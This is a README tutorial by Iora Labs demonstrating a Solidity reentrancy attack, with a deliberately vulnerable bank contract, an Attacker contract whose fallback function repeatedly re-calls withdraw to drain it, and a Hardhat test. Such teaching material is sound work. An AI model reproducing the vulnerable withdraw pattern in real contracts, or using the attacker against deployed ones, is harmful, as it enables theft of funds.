# Reentrancy Attack Demonstration in Solidity

This project is a simple demonstration of a reentrancy attack in Solidity, using Hardhat for testing. The example consists of two contracts: `VulnerableBank` and `Attacker`.

## Credits

This tutorial was created by Pedro Magalhães.

- Pedro Magalhães, Iora Labs
- Email: pedro@ioralabs.com
- Website: https://ioralabs.com

## Contracts

### VulnerableBank

The `VulnerableBank` contract simulates a very simple bank that allows users to deposit and withdraw Ether. However, it has a critical security flaw that allows for a reentrancy attack.
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract VulnerableBank {
mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint amount = balances[msg.sender];
        (bool success, ) = msg.sender.call.value(amount)("");
        require(success);
        balances[msg.sender] = 0;
    }
}
```
In the withdraw function, the contract sends the amount of Ether to the caller before zeroing out their balance. This allows a malicious contract to recursively call the withdraw function and drain the VulnerableBank contract of all its Ether.

### Attacker

The Attacker contract is designed to exploit the reentrancy vulnerability in the VulnerableBank contract.

```
pragma solidity ^0.5.0;

import "./VulnerableBank.sol";

contract Attacker {
VulnerableBank public vulnerableBank;

    constructor(address _vulnerableBank) public {
        vulnerableBank = VulnerableBank(_vulnerableBank);
    }

    function attack() public payable {
        require(msg.value > 0);
        vulnerableBank.deposit.value(msg.value)();
        vulnerableBank.withdraw();
    }

    function () external payable {
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw();
        }
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}
```

The`attack`function of the`Attacker`contract calls the`deposit`and`withdraw`functions of the`VulnerableBank` contract. The fallback function then checks if the balance of the VulnerableBank contract is greater than or equal to 1 Ether, and if so, it recursively calls the withdraw function, thereby draining the VulnerableBank contract of its Ether.

## Testing

The test script reentrancyAttack.js uses Hardhat to test the reentrancy attack.

```
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Reentrancy Attack", function () {
let vulnerableBank;
let attacker;
let accounts;

    beforeEach(async function () {
        accounts = await ethers.getSigners();

        const VulnerableBank = await ethers.getContractFactory("VulnerableBank");
        vulnerableBank = await VulnerableBank.deploy();
        await vulnerableBank.deployed();

        const Attacker = await ethers.getContractFactory("Attacker");
        attacker = await Attacker.deploy(vulnerableBank.address);
        await attacker.deployed();
    });

    it("should perform a reentrancy attack", async function () {
        // Deposit additional ether into VulnerableBank
        await vulnerableBank.connect(accounts[0]).deposit({ value: ethers.utils.parseEther("1") });

        await attacker.connect(accounts[1]).attack({ value: ethers.utils.parseEther("1") });

        // Now expect the attacker's balance to be above the 1 ether they initially sent
        expect(await attacker.getBalance()).to.be.above(ethers.utils.parseEther("1"));
        expect(await vulnerableBank.balances(accounts[1].address)).to.equal(0);
    });

    it("should have 0 balance in VulnerableBank after the attack", async function () {
        // Check the balance of VulnerableBank after the attack
        expect(await ethers.provider.getBalance(vulnerableBank.address)).to.equal(0);
    });
});
```

In the test, the VulnerableBank and Attacker contracts are deployed, and then the attack function is called. After the attack, the test checks that the Attacker contract's balance is greater than the 1 Ether initially sent and that the VulnerableBank contract's balance is 0.

## Running the Test

Follow these steps to run the test:

1. **Install Node.js and npm:** Ensure that you have Node.js and npm installed on your machine. You can download Node.js and npm from [here](https://nodejs.org/en/download/).

2. **Install Hardhat:** Install Hardhat, which is a development environment to compile, deploy, test, and debug your Ethereum software. Run this command in your terminal to install Hardhat globally:
```
npm install --global hardhat
```


3. **Install Hardhat:** Clone the repository: Clone this GitHub repository to your local machine.
```
git clone git@github.com:ioralabs/reentrancy_attack_example.git
```

4. **Install dependencies:** Navigate to the root directory of the cloned repository and install the necessary dependencies:
```
cd reentrancy_attack_example
npm install
```
5. **Run the test:** Now you can run the test:
```
npx hardhat test
```

The test command will compile your contracts and run the test files located in the test directory.